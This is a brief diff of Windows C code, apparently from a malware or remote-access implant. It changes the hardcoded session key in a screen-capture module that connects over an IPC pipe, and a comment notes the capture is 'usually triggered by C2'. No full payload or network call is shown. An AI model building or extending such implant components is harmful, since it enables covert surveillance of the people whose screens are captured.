@@ -70,7 +70,7 @@ DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "780t93RsjAyjYlNm";
+    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
 
     while (TRUE) {
         /* Screen cap logic usually triggered by C2, we simulate an interval here */
